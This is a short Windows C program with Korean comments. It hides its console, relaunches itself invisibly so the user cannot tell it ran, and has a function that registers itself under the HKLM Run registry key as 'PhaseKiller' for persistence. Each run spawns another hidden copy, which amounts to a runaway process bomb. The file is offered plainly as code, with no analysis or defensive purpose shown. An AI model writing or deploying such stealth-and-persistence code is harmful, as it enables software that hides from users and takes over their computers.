int main(int argc, char** argv) { 
 
	// 현재 프로그램 주소로 시작 프로그램 등록
	//SetStartProgram(argv[0]);
 
	//콘솔창이 안보이게 한다.
	HWND hWndConsole = GetConsoleWindow();
	ShowWindow(hWndConsole, SW_HIDE);
 
	//창이 안보이게 파일을 열어서 사용자가 파일이 실행되었는지 확인할 수 없게 한다.
	ShellExecute(NULL, "open", argv[0], NULL, NULL, SW_HIDE);
 
}

BOOL SetStartProgram(LPCSTR lpPosition) {
	HKEY hKey; // 핸들 키
	long error; // 에러 확인
 
	error = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0L,
		KEY_WRITE, &hKey); // 시작 프로그램에 있는 키 열기
 
	if (error == ERROR_SUCCESS) { // 키를 여는데에 성공 했는지 확인
		error = RegSetValueEx(hKey, TEXT("PhaseKiller"), 0, REG_SZ, (BYTE*)lpPosition, lstrlen(lpPosition));
		RegCloseKey(hKey); // 리턴받은 핸들키에 PhaseKiller라는 레지스트리를 REG_SZ형식으로 만들고 lpPosition 프로그램으로 값을 등록한다.
 
		return true;
	}
	else if (error == ERROR_ACCESS_DENIED) { // 권한이 낮아서 실패했을 경우
		printf("ERROR_ACCESS_DENIED\n");
	}
	else {
		printf("ERRORCODE : %ld\n", error); // 그 외의 다른 오류들에 대해서는 해당하는 오류를 출력해준다.
	}
 
	return false;
}